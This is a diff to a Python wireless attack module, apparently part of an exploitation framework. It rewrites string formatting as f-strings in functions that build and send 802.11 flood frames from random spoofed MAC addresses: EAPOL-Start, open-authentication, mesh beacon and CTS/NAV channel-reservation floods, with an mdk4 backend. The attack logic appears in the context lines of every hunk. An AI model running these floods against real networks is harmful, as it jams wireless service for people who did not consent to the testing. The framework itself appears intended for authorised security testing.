@@ -91,7 +91,7 @@ class Exploit(Exploit):
         sent = 0
         try:
             while time.time() < end_time:
-                src_mac = ":".join("{:02x}".format(random.randint(0, 255)) for _ in range(6))
+                src_mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
                 pkt = (
                     RadioTap() /
                     Dot11(type=2, subtype=8, addr1=target, addr2=src_mac, addr3=target) /
@@ -103,7 +103,7 @@ class Exploit(Exploit):
         except KeyboardInterrupt:
             pass
 
-        print_success("EAPOL-Start flood: {} frames sent.".format(sent))
+        print_success(f"EAPOL-Start flood: {sent} frames sent.")
 
     def _scapy_auth_flood(self) -> None:
         """Flood 802.11 Open Auth frames from random MACs via Scapy."""
@@ -122,7 +122,7 @@ class Exploit(Exploit):
             self.duration if self.duration > 0 else "∞"))
         try:
             while time.time() < end_time:
-                src = ":".join("{:02x}".format(random.randint(0, 255)) for _ in range(6))
+                src = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
                 pkt = (RadioTap() /
                        Dot11(type=0, subtype=11,
                              addr1=target, addr2=src, addr3=target) /
@@ -133,7 +133,7 @@ class Exploit(Exploit):
                     time.sleep(delay)
         except KeyboardInterrupt:
             pass
-        print_success("Auth flood: {} frames sent.".format(sent))
+        print_success(f"Auth flood: {sent} frames sent.")
 
     def _scapy_mesh_flood(self) -> None:
         """Flood 802.11s Mesh Beacon frames via Scapy."""
@@ -150,8 +150,8 @@ class Exploit(Exploit):
             self.duration if self.duration > 0 else "∞"))
         try:
             while time.time() < end_time:
-                src = ":".join("{:02x}".format(random.randint(0, 255)) for _ in range(6))
-                ssid = "mesh-{:04x}".format(random.randint(0, 0xFFFF))
+                src = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
+                ssid = f"mesh-{random.randint(0, 0xFFFF):04x}"
                 pkt = (RadioTap() /
                        Dot11(type=0, subtype=8,
                              addr1="ff:ff:ff:ff:ff:ff", addr2=src, addr3=src) /
@@ -164,7 +164,7 @@ class Exploit(Exploit):
                     time.sleep(delay)
         except KeyboardInterrupt:
             pass
-        print_success("Mesh flood: {} frames sent.".format(sent))
+        print_success(f"Mesh flood: {sent} frames sent.")
 
     def _scapy_cts_flood(self) -> None:
         """Flood CTS frames to reserve channel time (NAV attack)."""
@@ -187,7 +187,7 @@ class Exploit(Exploit):
         except KeyboardInterrupt:
             pass
 
-        print_success("CTS/NAV flood: {} frames sent.".format(sent))
+        print_success(f"CTS/NAV flood: {sent} frames sent.")
 
 
     def check(self) -> str:
@@ -240,11 +240,11 @@ class Exploit(Exploit):
 
             cmd_str = " ".join(cmd)
             if self.dry_run:
-                print_info("DRY RUN: {}".format(cmd_str))
+                print_info(f"DRY RUN: {cmd_str}")
                 return
 
-            print_status("Launching {} via mdk4...".format(self.mode))
-            print_info("Command: {}".format(cmd_str))
+            print_status(f"Launching {self.mode} via mdk4...")
+            print_info(f"Command: {cmd_str}")
 
             try:
                 if self.duration > 0:
@@ -258,7 +258,7 @@ class Exploit(Exploit):
             return
 
         if self.dry_run:
-            print_info("DRY RUN: {} via scapy on {}".format(self.mode, self.interface))
+            print_info(f"DRY RUN: {self.mode} via scapy on {self.interface}")
             return
 
         if self.mode == "eapol_start":
@@ -270,4 +270,4 @@ class Exploit(Exploit):
         elif self.mode == "mesh_flood":
             self._scapy_mesh_flood()
         else:
-            print_info("For {} mode with scapy backend, use mdk4 instead.".format(self.mode))
+            print_info(f"For {self.mode} mode with scapy backend, use mdk4 instead.")
